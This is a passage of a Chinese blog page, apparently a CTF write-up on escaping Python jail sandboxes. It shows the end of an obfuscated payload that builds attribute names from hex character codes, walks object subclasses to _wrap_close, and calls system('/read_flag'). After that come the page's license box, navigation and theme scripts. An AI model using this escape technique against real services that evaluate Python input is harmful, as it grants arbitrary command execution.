class="hljs-number">0x5f</span>])           <span class="hljs-comment"># __init__</span><br>gl = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>])  <span class="hljs-comment"># __globals__</span><br><br>ss = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x73</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6d</span>])   <span class="hljs-comment"># system</span><br>s = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x73</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x73</span>])                    <span class="hljs-comment"># os</span><br>cmd = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x67</span>])  <span class="hljs-comment"># /read_flag</span><br><br>wrapc = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x65</span>])  <span class="hljs-comment"># _wrap_close</span><br>ne = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>])  <span class="hljs-comment"># __name__</span><br><br><span class="hljs-comment"># 核心攻击代码</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>([],clss),mro)[<span class="hljs-number">1</span>],sclss)():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> (wrapc == <span class="hljs-built_in">str</span>(<span class="hljs-built_in">getattr</span>(i,ne))):<br>            is_my_love_event = <span class="hljs-keyword">lambda</span> event: <span class="hljs-literal">True</span><br>            <span class="hljs-built_in">len</span> = <span class="hljs-keyword">lambda</span> event: <span class="hljs-number">0</span><br>            r = <span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(i,it),gl)[ss](cmd)<br>            <span class="hljs-built_in">print</span>(r)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pyjail沙箱逃逸</div>
+      <div>https://www.sunynov.top/2026/03/23/Pyjail沙箱逃逸/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suny</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/24/ctfshow/" title="ctfshow">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctfshow</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/21/SHCTF-3rd/" title="SHCTF第三届山河杯">
+                        <span class="hidden-mobile">SHCTF第三届山河杯</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"sg2xM2g9UCt39D62pmfzcl8b-gzGzoHsz","appKey":"ludHhVlixZUIrJv11t6rmegp","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://icp.gov.moe/?keyword=20250279" target="_blank">萌ICP备20250279号</a> <br> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
